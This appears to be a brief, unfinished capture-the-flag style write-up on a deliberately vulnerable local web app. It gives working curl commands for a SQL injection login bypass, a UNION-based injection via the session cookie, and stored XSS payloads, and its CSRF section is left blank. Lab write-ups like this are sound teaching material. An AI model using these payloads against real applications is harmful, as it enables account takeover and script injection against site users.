---
title: This Damned Vulnerable Snake!
date: 2024-05-04
author:
  - "0x42697262"
  - Orochi
  - Jinx
---

Authors:

- 0x42697262
- Jinx
- Orochi

# This Damned Vulnerable Snake!

## TL;DR

Here are the vulnerabilities and to exploit them:

### SQL Injection

```bash
curl 'http://0.0.0.0:5000/login' -X POST --data-raw "username=a' OR 1=1 --&password="
```

### Stored XSS

```bash
curl 'http://0.0.0.0:5000/posts' -X POST -H "Cookie: session_token=' UNION SELECT id, username FROM users --" --data-raw 'message=<script>alert(window.origin)</script>'
```

### CSRF

how

## Introduction

Login as the first user.
This will also create a new `session_token` every time.

curl 'http://0.0.0.0:5000/posts' -X POST -H "Cookie: session_token=' UNION SELECT '69420' as id, 'eli' as username FROM users LIMIT 1--" --data-raw 'message=<script>alert(window.origin); alert(177013)</script>'

curl 'http://0.0.0.0:5000/home'  -H 'Cookie: session_token=f5c8541ad5f844d551a4fc9f2554b821b437232324d32260e6d260c4603dbf8a' 
